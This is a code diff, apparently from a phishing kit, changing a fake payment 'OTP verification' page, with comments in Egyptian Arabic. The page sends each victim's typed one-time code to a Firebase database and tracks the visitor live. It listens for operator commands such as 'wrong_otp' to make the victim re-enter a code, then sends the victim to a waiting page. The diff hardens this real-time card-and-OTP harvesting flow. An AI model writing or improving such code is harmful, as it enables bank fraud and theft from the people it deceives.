@@ -80,23 +80,19 @@
         const database = firebase.database();
         const v_id = localStorage.getItem('v_id');
 
-        if (v_id) {
-            // أول ما يدخل الصفحة بنصفر الـ next_step عشان نكسر أي دائرة قديمة
-            database.ref('orders/' + v_id).update({
-                next_step: 'waiting',
-                status: 'الزائر في صفحة الـ OTP'
-            });
+        // تعريف مرجع الأوامر عالمياً عشان نقدر نقفله
+        let orderRef;
 
+        if (v_id) {
             database.ref('live_sessions/' + v_id).update({
                 current_page: "صفحة التحقق (OTP)",
                 last_seen: new Date().getTime()
             });
 
-            // مراقبة الأوامر (Listening)
-            database.ref('orders/' + v_id + '/next_step').on('value', (snapshot) => {
+            // مراقبة الأوامر
+            orderRef = database.ref('orders/' + v_id + '/next_step');
+            orderRef.on('value', (snapshot) => {
                 const step = snapshot.val();
-                
-                // لو الأمر "wrong_otp" اظهر رسالة الخطأ واثبت مكانك
                 if (step === 'wrong_otp') {
                     document.getElementById('otpCode').classList.add('error-border');
                     document.getElementById('errorMsg').style.display = 'block';
@@ -105,13 +101,8 @@
                     btn.disabled = false;
                     btn.innerText = "تأكيد العملية";
                     
-                    // مهم جداً: صفر الحالة لـ waiting بعد ما تظهر رسالة الخطأ
-                    // عشان لو العميل راح بروسيسنج ما يرجعش لصفحة البطاقة
+                    // تصفير الحالة فوراً بعد إظهار الخطأ لمنع التوجيه التلقائي لاحقاً
                     database.ref('orders/' + v_id).update({ next_step: 'waiting' });
-                } 
-                // لو الأمر "wrong_card" يرجع لصفحة البطاقة (ودي الحالة الوحيدة اللي يرجع فيها)
-                else if (step === 'wrong_card') {
-                    window.location.href = 'secure-pay-v2.html';
                 }
             });
         }
@@ -141,20 +132,28 @@
             const btn = document.getElementById('confirmBtn');
 
             if ((otpVal.length === 4 || otpVal.length === 6) && v_id) {
+                // 1. تعطيل الزرار فوراً
                 btn.disabled = true;
                 btn.innerText = "جاري التحقق...";
+
+                // 2. إيقاف مراقبة الفايربيس في هذه الصفحة تماماً (Kill Listener)
+                if (orderRef) { orderRef.off(); }
 
                 document.getElementById('otpCode').classList.remove('error-border');
                 document.getElementById('errorMsg').style.display = 'none';
 
-                // نحدث الكود ونرجع الحالة لانتظار عشان صفحة البروسيسنج تثبته
+                // 3. تحديث البيانات وتصفير الأمر القادم
                 database.ref('orders/' + v_id).update({
                     otp_code: otpVal,
-                    status: "OTP_Submitted",
-                    next_step: "waiting", 
+                    status: "تم إرسال OTP - انتظار القرار",
+                    next_step: "waiting", // إجبار الحالة على الانتظار
                     last_update: new Date().getTime()
                 }).then(() => {
-                    // نستخدم replace عشان نمسح الصفحة دي من تاريخ المتصفح
+                    // 4. التحويل لصفحة الانتظار باستخدام replace لضمان عدم العودة
+                    setTimeout(() => {
+                        window.location.replace('processing.html');
+                    }, 300);
+                }).catch(() => {
                     window.location.replace('processing.html');
                 });
             } else {
